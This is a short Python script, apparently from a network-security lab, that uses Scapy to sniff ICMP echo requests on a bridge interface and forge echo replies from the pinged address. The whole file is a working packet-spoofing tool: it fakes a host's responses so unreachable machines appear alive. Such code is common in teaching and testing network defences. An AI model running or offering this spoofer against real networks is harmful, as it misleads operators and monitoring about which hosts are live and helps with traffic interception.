#!/usr/bin/python
from scapy.all import *

def spoof_packet(pkt):
        if(pkt[2].type == 8):
                src=pkt[1].src
                dst=pkt[1].dst
                seq = pkt[2].seq
                id = pkt[2].id
                load=pkt[3].load
                print(f"Genuine request: src {src} dst {dst} ")
                print(f"Spoofed reply: src {dst} dst {src}  \n")
                reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/load
                send(reply,verbose=0)
interfaces = ['br-19cac0a40c85']
pkt = sniff(iface=interfaces, filter='icmp', prn=spoof_packet)